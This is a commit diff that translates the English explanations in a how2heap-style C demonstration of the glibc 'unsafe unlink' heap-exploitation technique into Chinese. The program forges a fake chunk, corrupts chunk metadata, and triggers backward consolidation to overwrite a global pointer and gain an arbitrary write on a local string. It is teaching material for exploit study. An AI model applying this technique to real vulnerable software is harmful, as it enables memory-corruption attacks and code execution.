9c4cb8cd2c1272290a69549daefa2dfe38522b03
Frank Wu <56958034+GhostFrankWu@users.noreply.github.com>
2022-12-28 23:44:27 +0800

    Update unsafe_unlink.c

--- glibc_2.31/unsafe_unlink.c
+++ glibc_2.31/unsafe_unlink.c
@@ -9,56 +9,58 @@ uint64_t *chunk0_ptr;
 int main()
 {
 	setbuf(stdout, NULL);
-	printf("Welcome to unsafe unlink 2.0!\n");
-	printf("Tested in Ubuntu 20.04 64bit.\n");
-	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
-	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");
+	printf("unlink在Ubuntu 22.04 x64测试通过.\n");
+	printf("当你有一个已知地址的指针时候可以使用unlink（已知的是指针的地址不是指针的值）.\n");
+	printf("最常见的场景是一个由全局指针的堆内存可以溢出（甚至是obo）.\n");
 
 	int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
 	int header_size = 2;
 
-	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");
+	printf("我们要做的是通过free修改全局的chunk0_ptr实现任意写.\n\n");
 
+	printf("malloc两个足够大的区域，不进入tcache或者fastbin，这里是0x420.\n\n");
 	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
 	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
-	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
-	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);
+	printf("全局chunk0_ptr的地址是%p, 指向%p\n", &chunk0_ptr, chunk0_ptr);
+	printf("我们要修改的目标指针指向chunk1_ptr %p\n\n", chunk1_ptr);
 
-	printf("We create a fake chunk inside chunk0.\n");
-	printf("We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n");
+	printf("我们可以在chunk0里伪造一个chunk.\n");
+	printf("我们可以伪造chunk的大小来绕过检查chunksize(p) = prevsize\n");
+	//https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f
 	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
-	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
-	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
-	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
-	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
-	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
-	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
-	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
 
-	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
+	printf("设置伪造chunk的'next_free_chunk' (fd)指向&chunk0_ptr-0x18使得P->fd->bk = P.\n");
+	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
+	printf("设置伪造chunk的previous_free_chunk' (bk)指向&chunk0_ptr-0x10使得P->bk->fd = P.\n");
+	printf("这样就可以绕过检查: (P->fd->bk != P || P->bk->fd != P) == False\n");
+	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
+
+	printf("伪造的chunk fd: %p\n",(void*) chunk0_ptr[2]);
+	printf("伪造的chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
+
+	printf("假设我们在chunk0有一个堆溢出，可以让我们随意更改chunk1的元数据.\n");
 	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
-	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
-	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
+	printf("我们减小chunk0的大小(通过修改chunk1中的'previous_size') 这样free就会认为chunk0是从我们伪造的chunk开始的.\n");
+	printf("伪造的chunk一定要从我们知道地址的指针指向的地方开始.\n");
 	chunk1_hdr[0] = malloc_size;
-	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
-	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
+	printf("如果我们“正常地”free了chunk0，chunk1.previous_size会是0x430，但是它现在是: %p\n",(void*)chunk1_hdr[0]);
+	printf("通过设置chunk1的'previous_in_use'为False(最低位为0)，我们将chunk0标记为了free.\n\n");
 	chunk1_hdr[1] &= ~1;
 
-	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
-	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
+	printf("现在我们释放chunk1会触发consolidate后向合并，这样会unlink我们伪造的chunk, 复写chunk0_ptr.\n");
+	//unlink的代码见https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
 	free(chunk1_ptr);
 
-	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
+	printf("此时我们就可以用chunk0_ptr来复写任意地址.\n");
 	char victim_string[8];
 	strcpy(victim_string,"Hello!~");
 	chunk0_ptr[3] = (uint64_t) victim_string;
 
-	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
-	printf("Original value: %s\n",victim_string);
+	printf("chunk0_ptr现在指向任意我们选择的地方，用它复写目标字符串.\n");
+	printf("原始值: %s\n",victim_string);
 	chunk0_ptr[0] = 0x4141414142424242LL;
-	printf("New Value: %s\n",victim_string);
+	printf("新的指: %s\n",victim_string);
 
 	// sanity check
 	assert(*(long *)victim_string == 0x4141414142424242L);
 }
-
